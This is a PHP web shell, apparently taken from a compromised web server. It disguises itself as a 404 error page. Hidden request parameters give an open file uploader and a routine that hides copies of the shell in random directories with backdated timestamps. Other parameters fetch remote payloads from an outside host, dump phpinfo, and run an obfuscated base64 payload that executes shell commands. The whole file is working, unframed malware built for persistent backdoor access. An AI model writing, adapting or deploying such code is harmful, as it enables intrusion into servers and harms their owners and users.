<?php
if(isset($_REQUEST['up'])){
if(isset($_POST['Submit'])){
    $filedir = ""; 
    $maxfile = '2888888';

    $userfile_name = $_FILES['image']['name'];
    $userfile_tmp = $_FILES['image']['tmp_name'];
    if (isset($_FILES['image']['name'])) {
        $abod = $filedir.$userfile_name;
        @move_uploaded_file($userfile_tmp, $abod);
  
echo"<center><b>Done ==> <a href='/$userfile_name'>$userfile_name</a></b></center>";
}
}
else{
echo '<b>'.php_uname().'</b>';
echo'
<form method="POST" action="" enctype="multipart/form-data"><input type="file" name="image"><input type="Submit" name="Submit" value="Submit"></form>';
}
}
elseif(isset($_REQUEST['bckdrupl'])){
function randomName($m) {
    $alphabet = 'abcdefghijklmnopqrstuvwxyz1234567890';
    $pass = array();
    $alphaLength = strlen($alphabet) - 1;
    for ($i = 0; $i < $m; $i++) {
        $n = rand(0, $alphaLength);
        $pass[] = $alphabet[$n];
    }
    return implode($pass);
}
$rndname = randomName(mt_rand(4,6));
$rndname2 = randomName(mt_rand(4,6)).".php";
function listdirs($dir) {
    static $alldirs = array();
    $dirs = glob($dir . '/*', GLOB_ONLYDIR);
    if (count($dirs) > 0) {
        foreach ($dirs as $d) $alldirs[] = $d;
    }
    foreach ($dirs as $dir) listdirs($dir);
    return $alldirs;
}
$directory_list = listdirs('.');
$myArray = $directory_list;
shuffle($myArray);
$randomValue = $myArray[0];
$randomValue2 = $myArray[1];
$randomval = str_replace(".","",$randomValue);
$randomval2 = str_replace(".","",$randomValue2);
$oldPath = getcwd();
$oldfilename = basename(__FILE__);
copy("./$oldfilename","$randomValue/$rndname.php");
$dorlink = $_SERVER['SERVER_NAME'].$randomval."/$rndname.php";
chdir($randomValue);
touch("./$oldfilename", time() - mt_rand(60*60*24*30, 60*60*24*365));
touch(dirname("./$oldfilename"), time() - mt_rand(60*60*24*30, 60*60*24*365));
chdir($oldPath);
chdir($randomValue2);
$fp = fopen($rndname2, 'w');
fwrite($fp, "<?php if(isset(\$_POST['Submit'])){ \$filedir = ''; \$maxfile = '2888888'; \$userfile_name = \$_FILES['image']['name']; \$userfile_tmp = \$_FILES['image']['tmp_name']; if (isset(\$_FILES['image']['name'])) { \$abod = \$filedir.\$userfile_name; @move_uploaded_file(\$userfile_tmp, \$abod); echo\"<center><b>Done ==> \$userfile_name</b></center>\"; } } else{ echo '<b>Kel28</b><br>'; echo '<b>'.php_uname().'</b>'; echo '<form method=\"POST\" action=\"\" enctype=\"multipart/form-data\"><input type=\"file\" name=\"image\"><input type=\"Submit\" name=\"Submit\" value=\"Submit\"></form>'; } ?>");
fclose($fp);
touch(dirname($rndname2), time() - mt_rand(60*60*24*30, 60*60*24*365));
touch($rndname2, time() - mt_rand(60*60*24*30, 60*60*24*365));
$upllink = $_SERVER['SERVER_NAME'].$randomval2."/".$rndname2;
echo "Bckdr: ".$dorlink."\r";
echo "<br>";
echo "Upl: ".$upllink."\n";
}
elseif(isset($_REQUEST['f1'])){
copy("http://comxvas.tk/1.txt","./security.php");
echo"<center><b>Done ==> <a href='/security.php'>security.php</a></b></center>";
}
elseif(isset($_REQUEST['f2'])){
copy("http://comxvas.tk/2.txt","./security.php");
echo"<center><b>Done ==> <a href='/security.php'>security.php</a></b></center>";
}
elseif(isset($_REQUEST['f3'])){
copy("http://comxvas.tk/3.txt","./security.php");
echo"<center><b>Done ==> <a href='/security.php'>security.php</a></b></center>";
}
elseif(isset($_REQUEST['c'])){
$oldfilename = basename(__FILE__);
echo '<b>TeddyIsHere</b><br>';
echo '<b>'.php_uname().'</b>';
touch("./$oldfilename", time() - mt_rand(60*60*24*30, 60*60*24*365));
}
elseif(isset($_REQUEST['p'])){
phpinfo();
}
elseif(isset($_REQUEST['sos'])){
$gulf5 = "ba".""."s"."e".""."6"."".""."4"."_"."de"."". "c".""."o".""."d".""."e"; assert($gulf5('ZXZhbChiYXNlNjRfZGVjb2RlKCdjMmhsYkd4ZlpYaGxZeWduZEc5MVkyZ2dMV1FnSWpFZ1RXRjVJREl3TVRVZ01UQTZNaklpSUhkd0xYTnRkSEF1Y0dod0p5azdDaVJqWkhOdmMyVmthU0E5SUhOb1pXeHNYMlY0WldNb0oyeHpJQzFrSUNvdkp5azdDbVZqYUc4Z0pHTmtjMjl6WldScE93b2tZMjl3ZVhOdmMyVmthU0E5SUhOb1pXeHNYMlY0WldNb0oyWnBibVFnTGlBdGRIbHdaU0JrSUMxdFlYaGtaWEIwYUNBeElDMWxlR1ZqSUdOd0lDMW1JQzR2ZDNBdGMyMTBjQzV3YUhBZ2UzMGdYRHNuS1RzS1pXTm9ieUFpTFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExWeHlYRzRpT3dva1kyUnpiM05sWkdreUlEMGdjMmhsYkd4ZlpYaGxZeWduWTJRZ0xpNHZPMnh6SUMxa0lDb3ZKeWs3Q21WamFHOGdKR05rYzI5elpXUnBNanNLSkdOdmNIbHpiM05sWkdreUlEMGdjMmhsYkd4ZlpYaGxZeWduWm1sdVpDQXVMaThnTFhSNWNHVWdaQ0F0YldGNFpHVndkR2dnTVNBdFpYaGxZeUJqY0NBdFppQXVMM2R3TFhOdGRIQXVjR2h3SUh0OUlGdzdKeWs3JykpOw=='));
}
else{
echo "<!DOCTYPE HTML PUBLIC '-//IETF//DTD HTML 2.0//EN'>
<HTML><HEAD>
<TITLE>404 Not Found</TITLE>
</HEAD><BODY>

<h1>Not Found (404)</h1>

The requested URL ";
echo $_SERVER['REQUEST_URI'];
echo "
was not found on this server.
<hr>

";
echo $_SERVER['SERVER_NAME'];
}
?>